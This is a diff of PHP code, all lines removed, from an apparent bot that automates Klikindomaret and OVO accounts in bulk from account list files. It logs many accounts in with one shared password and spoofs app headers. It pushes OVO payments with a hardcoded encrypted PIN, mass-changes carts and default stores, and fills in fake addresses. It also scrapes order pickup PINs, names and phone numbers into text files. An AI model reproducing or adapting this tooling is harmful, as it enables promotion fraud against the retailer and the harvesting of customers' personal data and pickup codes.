-											$submitpay = curlx('https://payment.klikindomaret.com/paymentcenter/Payments/SubmitPayment', '{"PaymentTypeCode":"BPOVO","TotalAmount":"' . $linkx . '","Token":"","IsCoupon":"0","IsPaymentPartial":0,"WalletAmmount":"0","WalletPassword":"","IsVA":false,"PaymentTypeName":"OVO","IsFlashSale":"False","emailCustomer":"' . $nomor . '@klikindomaret.com","useCoin":false,"usePoint":false,"partialPointOVO":"0","potentialCoinShopee":"","Source":"MobileSite-Android","Client":"klikindomaret"}', $parcel1);
-											echo @color('purple', "\n\n{$submitpay[1]}\n\n");
-											$data = json_decode($submitpay[1]);
-											$url = $data->Url;
-											echo @color('green', "\n\n{$url}\n\n");
-											$pecah = explode('&', $url);
-											$tok = $pecah[3];
-											$tokenn = str_replace('token=', '', $tok);
-											$tnxid = $pecah[0];
-											$clientTxnId = str_replace('https://cb.ovo.id/cellblockui/v2/paymentPin?clientTxnId=', '', $tnxid);
-											$dest = $pecah[5];
-											$destination = str_replace('destination=', '', $dest);
-											$stat = $pecah[6];
-											$state = str_replace('destination=', '', $stat);
-											// echo @color('yellow ', "MASUKKAN TOKEN AKSES");
-											// $tokenn = trim(fgets(STDIN));
-											// echo @color('yellow ', "MASUKKAN TNX ID");
-											// $clientTxnId = trim(fgets(STDIN));
-											// echo @color('yellow ', "MASUKKAN DESTINATIOn");
-											// $destination = trim(fgets(STDIN));
-											// echo @color('yellow ', "MASUKKAN STATE");
-											// $state = trim(fgets(STDIN));
-											$post01 = '{"action":"payment","clientTxnId":"' . $clientTxnId . '","destination":"' . $destination . '","state":"' . $state . '","submissionType":"redirect","token":"' . $tokenn . '","encryptedPin":"mwLP7EOdiBgUtYpFtKM352d5Gp8cnYjqTL3SXSZOmuKd4z/UKf6eX6ButjmX2lgOCzP5DQxssMrF1fn9T8569aNeTWD4nF//514wo5kfCI3DYbMdQHbXZlBeOv5k9tS4z4EIvTAOFM3FZAzM5zd/ha7AnHsoGIv1yKBk6/hpjHiV9dqOaoNWQbETzFVp7JMDFEHnQdTsKIAX/nvApZ5iXViQb/e82d0cJLgvH2jPs8HwtDcdbRCMEBmzzAVYYzERrH4uxTtYFHigV4Rkue1P+yJDZZzHSAQzlauxVa21EB6JL0HzhdOOeaBd1nnznFkr9XrU5lkKKNlaA9UVd5NWHw=="}';
-											$str = strlen($post01);
-											$parcel11 = array();
-											$parcel11[] = 'Host: apigw-fe.ovo.id';
-											$parcel11[] = 'content-length: ' . $str;
-											$parcel11[] = 'authorization: Bearer ' . $tokenn;
-											$parcel11[] = 'Origin: https://cb.ovo.id';
-											$parcel11[] = 'client-id: oamerchantar';
-											$parcel11[] = 'user-agent: okhttp/4.9.3';
-											$parcel11[] = 'content-type: application/json';
-											$parcel11[] = 'Accept: */*';
-											// $parcel11[] = 'accept-encoding: gzip, deflate, br';
-											$parcel11[] = 'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7';
-											$gasin = curlx('https://apigw-fe.ovo.id/user/v1/oauth/securitycode/verify', $post01, $parcel11);
-											echo @color('nevy', "\n\n{$gasin[1]}\n\n");
-											$data = json_decode($gasin[1]);
-											// $Url = $data->Url
-											$thx = curlx('https://thankyoupage.klikindomaret.com/?client=klik&transactioncode=' . $clientTxnId, null, $kuntul);
-											echo @color('purple', "\n\n{$thx[1]}\n\n");
-											$thx = array();
-											$thx[] = 'Content-Type: application/json';
-											$thx[] = 'Host: after-sales-service-api.klikindomaret.com';
-											$thx[] = 'Applicationkey: indomaret';
-											$thx[] = 'Authorization: Bearer ' . $toked;
-											$thx[] = 'User-Agent: okhttp/3.12.1';
-											$thx2 = curlx("https://after-sales-service-api.klikindomaret.com/api/Payment/DetailPaymentThankyouPage?TransactionCode={$clientTxnId}&TypeCode=", null, $thx);
-											echo @color('purple', "\n\n{$thx2[1]}\n\n");
-											// echo "\n\n$submitpay[1]\n\n";
-											$sttpay = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-											echo @color('purple', "\n\n{$sttpay[1]}\n\n");
-											$sttp = json_decode($sttpay[1]);
-											$stbyr = $sttp[0]->StatusPembayaran;
-											$sttype = $sttp[0]->PaymentTypeName;
-											$sttexp = $sttp[0]->PaymentExpiredDate;
-											$TransactionCode = $sttp[0]->TransactionCode;
-											$jenenge = $sttp[0]->CustomerContactName;
-											$totale = $sttp[0]->Total;
-											$PaymentAccountID = $sttp[0]->PaymentAccountID;
-											   $dircrot = $sttp[0]->Referer;
-											if ($stbyr == null) {
-												$sttbayar = 'Segera cek';
-											} else {
-												$sttbayar = $stbyr;
-											}
-										
-									echo " {$Yellow}➤{$White} Payment Redirect	 : " . $dircrot . "\n";
-											echo @color('yellow', "Kode Transaksi: ");
-											echo @color('nevy', "{$TransactionCode}\n");
-											echo @color('yellow', "Status Pembayaran: ");
-											echo @color('nevy', "{$sttbayar}\n");
-											echo @color('yellow', "Tipe Pembayaran: ");
-											echo @color('nevy', "{$sttype}\n");
-											echo @color('yellow', "KODE VA: ");
-											echo @color('nevy', "{$PaymentAccountID}\n");
-											echo @color('yellow', "PaymentExpiredDate: ");
-											echo @color('nevy', "{$sttexp}\n");
-											save("KodeTransaksi: " . $TransactionCode . "|Nama: " . $jenenge . "|Nomor: " . $nomor . "|KodeToko: " . $tokonejon . "|Total: " . $totale . "|Kode VA :" . $PaymentAccountID . "\n", 'transaksiBCA.txt');
-											unlink('nganue.txt');
-											break;
-									}
-								} else {
-									echo @color('red', "{$gass[1]}\n");
-								}
-							} else {
-								echo @color('red', "{$poss[1]}\n");
-							}
-							break;
-					}
-				}
-			} else {
-				echo "{$responx}\n";
-			}
-			$no++;
-		}
-		break;
-	case '6':
-		masal2x:
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masal2x;
-		}
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			echo @color('nevy', "{$nomor}\n");
-			$DEVICE_ID = urut(16);
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$toko = $cok[0]->StoreDefault;
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=00000000-0000-0000-0000-000000000000&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $toko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					$scid = $za[0]->ID;
-					$cekk = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $scid . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $toko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-					$json = json_decode($cekk[1]);
-					foreach ($json[0]->CartItemNotification->Items as $mydata) {
-						$cx = $mydata;
-						foreach ($cx->ShoppingCartItems as $myxxx) {
-							$idne = $myxxx->ID;
-							$hapus = curlx('https://api.klikindomaret.com/api/ShoppingCart/RemoveCartItem?regionID=' . $RegionId, '{"CartId":"' . $scid . '","CartItemId":"' . $idne . '","PackagePermalink":""}', $kuntul);
-							if (strpos($hapus[1], '"IsSuccess":true')) {
-								echo @color('green', "Sukses Hapus item \n");
-								$sisane = curlx('https://api.klikindomaret.com/api/ShoppingCart/GetMyCartCount?customerId=9e5c6a58-2c6b-43b6-ae83-99cbc3dd280f', null, $kuntul);
-								echo @color('nevy', "Sisa Item di keranjang: ");
-								echo @color('yellow', "{$sisane[1]}\n");
-							} else {
-								echo @color('red', "X\n");
-							}
-						}
-					}
-				}
-				$no++;
-			} else {
-				echo @color('red', "{$responx}\n");
-			}
-		}
-		break;
-	case '7':
-		masal3x:
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		echo "Nomor Akun : ";
-		$nomor = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masal3x;
-		}
-		$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			$akunxx = explode(';', trim($kode));
-			$toko = strtoupper(trim($akunxx[0]));
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curl('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curl('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$storeid = $cok[0]->StoreDefault;
-				$getscid = curl('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=00000000-0000-0000-0000-000000000000&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $storeid . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . urut(16) . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-				$za = json_decode($getscid[1]);
-				$scid = $za[0]->ID;
-				$setaddress = curl('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=' . $toko . '&AddressType=0&CustomerAddressID=00000000-0000-0000-0000-000000000000&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=&CustomerLongitude=', null, $kuntul);
-				if (strpos($setaddress[1], '"Success":true')) {
-					$datatoko = json_decode($setaddress[1])[0];
-					$tokone = $datatoko->ResponseObject->StoreCode;
-					$tokone2 = $datatoko->ResponseObject->StoreName;
-					$tokone3 = $datatoko->ResponseObject->StoreAddress;
-					echo @color('yellow', "Kode Toko: ");
-					echo @color('nevy', "{$tokone}\n");
-					echo @color('yellow', "Toko : ");
-					echo @color('nevy', "{$tokone2} - {$tokone3}\n");
-					save("=======================\nKode Toko: {$tokone}\nToko : {$tokone2} - {$tokone3}\n", 'stoktoko.txt');
-					foreach ($datatoko->ResponseObject->Items as $mydata) {
-						$barang = $mydata->ProductDesc;
-						$qty = $mydata->QtyAvailable;
-						echo @color('yellow', "Item : ");
-						echo @color('nevy', "{$barang}\n");
-						echo @color('yellow', "Stok : ");
-						echo @color('nevy', "{$qty}\n");
-						save("Item : {$barang}\nStok : {$qty}\n", 'stoktoko.txt');
-					}
-					save("=======================\n", 'stoktoko.txt');
-					echo @color('yellow', "Tersimpan di stoktoko.txt\n");
-					echo "\n";
-				} else {
-					echo @color('red', "{$setaddress[1]}\n");
-				}
-				$no++;
-			} else {
-				echo @color('red', "{$responx}\n");
-			}
-		}
-		break;
-	case '8':
-		masal4x:
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masal4x;
-		}
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			echo @color('nevy', "{$nomor}\n");
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$toko = $cok[0]->StoreDefault;
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/GetLastestShop?customerID=' . $ID . '&regionID=' . $RegionId, null, $kuntul);
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo color('red', "ERROR KAK\n");
-				} else {
-					$scid = $za[0];
-					$cekk = curlx('https://api.klikindomaret.com/api/SalesOrder/GetSalesOrderHeaderListByCustomerIdAndSalesOrderNo/null?sortmode=&id=' . $ID . '&currPage=1&pageSize=30&no=&mode=0', null, $kuntul);
-					$json = json_decode($cekk[1]);
-					//print_r($json);
-					foreach ($json as $mydata) {
-						$kodene = $mydata->TransactionCode;
-						$cekkode = curlx('https://api.klikindomaret.com/api/Payment/DetailPayment?TransactionCode=' . $kodene . '&TypeCode=', null, $kuntul);
-						$hasil = json_decode($cekkode[1])[0];
-						$pine = $hasil->IStore->PINIndoPaket;
-						$toko = $hasil->IStore->KodeToko;
-						$almt = $hasil->StoreCustomerStreet;
-						$nama = $hasil->IStore->ReceiverName;
-						$noe = $hasil->CustomerMobile;
-						$waktu = $hasil->IStore->WaktuPengiriman;
-						$kodetrx = $hasil->JoinedSONumber;
-						if ($pine !== null) {
-							echo @color('yellow', "Kode Transaksi : ");
-							echo @color('nevy', "{$kodetrx}\n");
-							echo @color('yellow', "Nama : ");
-							echo @color('nevy', "{$nama}\n");
-							echo @color('yellow', "Nomor : ");
-							echo @color('nevy', "{$noe}\n");
-							echo @color('yellow', "Toko : ");
-							echo @color('nevy', "{$toko} {$almt}\n");
-							echo @color('yellow', "Waktu Pengambilan: ");
-							echo @color('nevy', "{$waktu}\n");
-							echo @color('yellow', "PIN Transaksi : ");
-							echo @color('nevy', "{$pine}\n");
-							echo "Item: \n";
-							foreach ($hasil->IStore->ItemDetail as $mydata) {
-								$brg = $mydata->Nama;
-								$qty = $mydata->Qty;
-								echo @color('nevy', "{$brg} ");
-								echo "X";
-								echo @color('yellow', "{$qty}\n");
-							}
-							echo @color('yellow', "Tersimpan di pin.txt\n");
-							echo "\n";
-							save("KodeTransaksi:" . $kodetrx . "|PIN_Transaksi:" . $pine . "|Nama:" . $nama . "|Nomor:" . $noe . "|WaktuAmbil:" . $waktu . "|KodeToko:" . $toko . "\n", 'pin.txt');
-						}
-					}
-				}
-				$no++;
-			} else {
-				echo @color('red', "{$responx}\n");
-			}
-		}
-		break;
-	case '9':
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		echo " Kode Toko : ";
-		$toko = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			echo @color('nevy', "{$nomor}\n");
-			echo "{$toko}\n";
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://api.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=00000000-0000-0000-0000-000000000000&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $toko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . urut(16) . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					if ($getscid[1] == []) {
-						echo @color('red', "KERANJANG KOSONG KAK\n");
-					} else {
-						$scid = $za[0]->ID;
-						for ($i = 0; $i < 3; $i++) {
-							$gets = curl('https://api.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul);
-						}
-						$getx = curl('https://api.klikindomaret.com/api/Store/GetListAutoComplete?StoreCode=' . $toko . '&customerLatitude=&customerLongitude=', null, $kuntul);
-						$setaddress = curl('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=' . $toko . '&AddressType=0&CustomerAddressID=00000000-0000-0000-0000-000000000000&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=&CustomerLongitude=', null, $kuntul);
-						if (strpos($setaddress[1], '"Success":true')) {
-							$datatoko = json_decode($setaddress[1])[0]->ResponseObject->StoreName;
-							$datatoko2 = json_decode($setaddress[1])[0]->ResponseObject->StoreAddress;
-							$datatoko3 = json_decode($setaddress[1])[0]->ResponseObject->RegionName;
-							$datatoko4 = json_decode($setaddress[1])[0]->ResponseObject->DistrictName;
-							echo @color('yellow', "Kode Toko   : ");
-							echo @color('nevy', "{$toko}\n");
-							echo @color('yellow', "Nama Toko   : ");
-							echo @color('nevy', "{$datatoko}\n");
-							echo @color('yellow', "Alamat Toko : ");
-							echo @color('nevy', "{$datatoko2}\n");
-							echo @color('yellow', "Region Toko : ");
-							echo @color('nevy', "{$datatoko3}\n");
-							echo @color('yellow', "Distrik Toko: ");
-							echo @color('nevy', "{$datatoko4}\n");
-						} else {
-							echo @color('red', "GAGAL\n");
-							echo @color('red', "{$setaddress[1]}\n");
-						}
-						for ($i = 0; $i < 3; $i++) {
-							$getss = curl('https://api.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul);
-						}
-						$getc = curl('https://api.klikindomaret.com/api/Store/GetListByAreaWilayahStore?Lat=&Long=', null, $kuntul);
-						$setaddressxx = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/SetAddressTypeAndDefaultStore?mfp_id=' . $respid . '&isChangeAddress=False&ShoppingCartID=00000000-0000-0000-0000-000000000000', '{"CustomerID":"' . $ID . '","AddressType":0,"StoreCode":"' . $toko . '","StoreCodeDest":""}', $kuntul2);
-						if (strpos($setaddressxx[1], '"Message":"success"')) {
-							echo @color('green', "Sukses ganti\n");
-						} else {
-							echo @color('red', "GAGAL\n");
-							echo @color('red', "{$setaddressxx[1]}\n");
-						}
-					}
-				}
-				$no++;
-			} else {
-				echo @color('red', "{$responx}\n");
-			}
-		}
-		break;
-	case '10':
-		masal3sx:
-		echo @color('yellow', "Masukkan Password : ");
-		$password = trim(fgets(STDIN));
-		echo @color('yellow', "Masukkan zipcode: ");
-		$zipcone = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masal3sx;
-		}
-		$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$FName = $cok[0]->FName;
-				$LName = $cok[0]->LName;
-				$RegionId = $cok[0]->RegionId;
-				$storeid = $cok[0]->StoreDefault;
-				$awl = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetWhitelistZipCode?mfp_id=' . $respid, null, $kuntul2);
-				$getprov = curlx('https://api.klikindomaret.com/api/CustomerAddress/GetProvince?mfp_id=' . $respid, null, $kuntul2);
-				$kuntol = array();
-				$kuntol[] = 'Content-Type: application/json';
-				$kuntol[] = 'Host: api.klikindomaret.com';
-				$kuntol[] = 'User-Agent: okhttp/3.12.1';
-				$getzip = curlx('https://api-content.klikindomaret.com/api/Store/AUTOCOMPLETE_ZIPCODE_DISTRICTS_CITY_REGION?mfp_id=' . $respid . '&key=' . $zipcone, null, $kuntol);
-				$sds = json_decode($getzip[1]);
-				$distrik = $sds[0]->Districts;
-				$disterik = urlencode($distrik);
-				$getful = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/AUTOCOMPLETE_ADRESSBY_ZIPCODE?key=' . $zipcone . '&districtname=' . $disterik . '&mfp_id=' . $respid, null, $kuntul2);
-				$asdasd = json_decode($getful[1]);
-				$ProvinsiID = $asdasd[0]->ProvinsiID;
-				$KotaID = $asdasd[0]->KotaID;
-				$KecamatanID = $asdasd[0]->KecamatanID;
-				$KelurahanID = $asdasd[0]->KelurahanID;
-				$Kecamatan = $asdasd[0]->Kecamatan;
-				$Provinsi = $asdasd[0]->Provinsi;
-				$Kota = $asdasd[0]->Kota;
-				$model = ['Kenanga indah 2', 'mawar melati indah', 'bangka 11', 'sulawesi', 'murai sawah 4', 'lokasi baru jaya', 'sumbawa gang 3', 'delima 009', 'bilikanger ', 'imam bonjol 3', 'gunawangsa', 'batu aji', 'Songgoriti indah jaya', 'kuningan sari', 'lomba sapi', 'majumapan'];
-				$modelhp = $model[rand(0, 15)];
